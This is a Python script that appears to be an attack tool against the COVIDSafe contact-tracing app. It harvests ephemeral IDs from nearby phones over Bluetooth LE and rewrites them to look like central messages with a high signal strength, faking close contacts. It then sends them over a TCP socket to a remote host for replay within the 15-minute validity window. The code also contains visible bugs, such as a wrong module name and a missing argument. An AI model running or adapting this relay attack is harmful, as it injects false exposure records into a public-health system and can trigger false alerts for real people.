#!/usr/bin/env python3

import asyncio
import bleak
import random as rand
import json
import time
import sys
import socket

blacklist = set()
values = []

serviceUUID = "b82ab3fc-1595-4f6a-80f0-fe094cc218f9"
readUUID = "b82ab3fc-1595-4f6a-80f0-fe094cc218f9"

async def scan(blacklist):
    print("Beginning scan")
    addresses = set()
    devices = await bleak.BleakScanner.discover()

    for d in devices:
        addresses.add(d.address)

    blacklist = blacklist.intersection(addresses)
    addresses -= blacklist  # filter out static devices

    print(f"Scan complete\nFound addresses {addresses}")
    return blacklist, addresses

async def read_gatt(blackist, address, values):
    try:
        print(f"Attempting to scan address {address}")
        async with bleak.BleakClient(address) as client:
            serviceCollection = await client.get_services()
            services = serviceCollection.services

            # known bug in implementation of COVIDSafe causes
            # multiple duplicate services whenever Bluetooth is turned on or off
            # so we can't just search by UUID
            for service in services:
                if services[service].uuid == serviceUUID:
                    characteristic = services[service].get_characteristic(readUUID)
                    break

            charVal = await client.read_gatt_char(characteristic)
            print(f"Found characteristic value: {charVal}")
            charVal = json.loads(charVal.decode())

            for val in values:
                if val[0]["msg"] == charVal["msg"]:
                    return #already captured this ID

            # change to look like a central message
            del charVal["modelP"]
            charVal["modelC"] = ""
            charVal["rs"] = random.randint(-30, 20) # high value more likely to register as close contact


            values.append([charVal, time.time()]) # e
    except Exception as e: # rule out all devices which aren't running the app
        blacklist.add(address)
        print(e)

def scan_task(loop, blacklist):
    task = loop.create_task(scan(blacklist))
    loop.run_until_complete(task)
    return task.result()

def read_task(loop, blacklist, addresses):
    for address in addresses:
        task = loop.create_task(read_gatt(blacklist, address, values))
        loop.run_until_complete(task)


if __name__ == "__main__":
    if (len(sys.argv) != 3):
        print("Usage: scan ip port")
        exit()

    ip = sys.argv[1]
    port = int(sys.argv[2])

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((ip, port))
        loop = asyncio.get_event_loop()

        while True:
            # Discover devices
            blacklist, new_addresses = scan_task(blacklist)
            read_task(loop, blacklist, new_addresses)

            # epehemeral IDs are changed every 15 minutes so any captured data can
            # only be replayed for at most 15 minutes, this system isn't perfect but we
            # have no way of predicting when the phone will swap values
            send = []
            new_values = []
            for value in values:
                if value[1] + (15 * 60) > time.time():
                    new_values.append(value)
                    send.append(value[0])

            values = new_values
            sock.send(str(send))
